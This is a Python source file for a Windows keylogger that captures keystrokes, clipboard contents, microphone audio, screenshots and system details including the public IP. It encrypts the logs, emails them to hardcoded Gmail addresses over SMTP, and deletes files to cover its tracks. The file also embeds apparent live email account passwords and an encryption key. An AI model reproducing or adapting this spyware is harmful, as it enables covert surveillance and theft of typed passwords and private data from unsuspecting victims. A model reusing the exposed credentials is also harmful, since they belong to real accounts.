# THIS FILE SENDS EMAILS TO THE PERSON BUT DOESNT WORK APPPROP GO TO THE KEYLOGGER_PRO
#we use the below to send emails
# from text_email.mime.multipart import MIMEMultipart
# from text_email.mime.text import MIMEText
# from text_email.mime.base import MIMEBase
# from text_email import encoders
import smtplib

# from .tumaujumbe import tumaNaAttacho
#information of the system
import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
#we are going to save a
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import os
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText



keys_information = "press.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_press.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "razyimond@gmail.com"
password = "MpendaRasaYesBana@#69"

#get the users of the system
username = getpass.getuser()


toaddr = "razyimond@gmail.com"

#enc key gotten from the program written as gene
key = "lr-P4dNajeFXLopKXhy2nhXyHRLIsyyWu9-4IEZJcBE="


file_path = "C:\\Users\\Raymond\\PycharmProjects\\keylog"
extend = "\\"
file_merge = file_path + extend

#below sends email hadi mahali above sends email imesemwa
# def send_email(filename, attachment, toaddr):
#     fromaddr = email_address
#
#     msg = MIMEMultipart()
#
#     msg['From'] = fromaddr
#
#     msg['To'] = toaddr
#
#     msg['Subject'] = "Log File"
#
#     body = "Body_of_the_email"
#
#     msg.attach(MIMEText(body, "plain"))
#
#     filename = filename
#
#     attachment = open(attachment, 'rb')
#
#     p = MIMEBase('application', 'octet-stream')
#
#     p.set_payload((attachment).read())
#
#     encoders.encode_base64(p)
#
#     p.add_header('Content-Disposition', "attachemnt; filename=%s" % filename)
#
#     msg.attach(p)
#
#     s = smtplib.SMTP('smtp.gmail.com', 587)
#
#     s.starttls()
#
#     s.login(fromaddr, password)
#
#     text = msg.as_string()
#
#     s.sendmail(fromaddr, toaddr, text)
#
#     s.quit()

# send_email(keys_information, file_path + extend + keys_information, toaddr)

#we are going to send an email with a new method below sending the keylogged details

#import
smtp_port = 587
smtp_server = "smtp.gmail.com"

email_from = 'razyimond@gmail.com'
email_list = ['razyimond@gmail.com', 'mbithi@gmail.com']
pswd = 'mpqggrfvtmpkfskv'

subject = "We got some details"


def sendText_emails(email_list):
    for person in email_list:
        # the body of the email

        body = f"""
        line 1
        line 2
        line 3
        etc

            """

        # make a MIME object to define parts of the email

        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = person
        msg['Subject'] = subject

        # attach the bdoy of the message
        msg.attach(MIMEText(body, 'plain'))


        # we are attaching the csv file
        filename = 'e_keys.txt'

        # open the file in python as binary
        attachment = open(filename, 'rb')  # we are reading in binary dummy

        # encode base 64
        attachment_package = MIMEBase('application', 'octet-stream')
        attachment_package.set_payload((attachment).read())
        encoders.encode_base64(attachment_package)
        attachment_package.add_header('Content-Disposition', "attachment; filename=" + filename)
        msg.attach(attachment_package)

        # cast it to a string
        text = msg.as_string()

        # Connect with the server
        print("Connexting to server...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls()
        TIE_server.login(email_from, pswd)
        print("Successfully conned to server")
        print()

        # send emails to "persons" as listed
        print(f"Sending email to {person}...")
        TIE_server.sendmail(email_from, person, text)
        print((f"Email sent to:{person}"))

    TIE_server.quit()




#above sends emails
#the email part is bringing up an error
#the high as fuck
def computer_information():
    with open(file_path + extend + system_information, 'a')as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip =  get("https://api.ipify.org").text
            f.write("Public IP ADD: " + public_ip)
        except Exception:
            f.write("Could not get Public Ip add (might be max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System:" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n" )
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP ADD: " + IPAddr + "\n")

computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)


        except:
            f.write("Clipboard could not be copied")

copy_clipboard()


#getting the audio

def microphone():
    fs = 44100
    #the amount of time we aregoing to get on the microphone
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

#it is going to record for 10 secs
microphone()

#we have got the write file
# def write_file(count):
#     one = os.path.expanduser('~') + '/Documents/'
#     two = os.path.expanduser('~') + '/Pictures/'
#
#     list = [one, two]
#
#     filepath = random.choice(list)
#     filename = str(count) + 'I' + random.randint(1000000,9999999) + '.txt'
#     file = filepath + filename
#     delete_file.append(file)
#
#     with open(file, 'w') as fp:
#         fp.write(''.join(logged_data))

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

#the execution of the screenshot
screenshot()

############################################################################################################keylogger below #keylogger below
#keylogger below #keylogger below
#we are adding time controls for the keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

#keylogger below #keylogger below

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count +=1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys=[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        #below we are stopping the keylogger
        if currentTime > stoppingTime:
            return  False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    #at the time 1:08:06
    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        # send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        sendText_emails(email_list)
        copy_clipboard()

        number_of_iterations +=1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


#the code above already gets the keys



#we need encryption
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb')as f:
        f.write(encrypted)

    # send_email(encrypted_file_names[count], encrypted_file_names[count] ,toaddr)
    sendText_emails(email_list)
    count +=1

time.sleep(30)

#clean up tracks and delete files
delete_files = [system_information, clipboard_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)